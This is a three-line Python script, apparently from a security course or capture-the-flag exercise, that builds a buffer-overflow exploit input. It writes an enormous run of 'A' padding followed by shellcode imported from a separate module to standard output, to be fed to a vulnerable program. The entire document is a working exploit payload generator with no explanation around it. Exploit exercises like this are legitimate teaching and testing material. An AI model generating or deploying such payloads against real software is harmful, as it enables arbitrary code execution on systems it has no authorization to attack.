from shellcode import shellcode
import sys
sys.stdout.buffer.write(b'A' * 4294443052 + shellcode)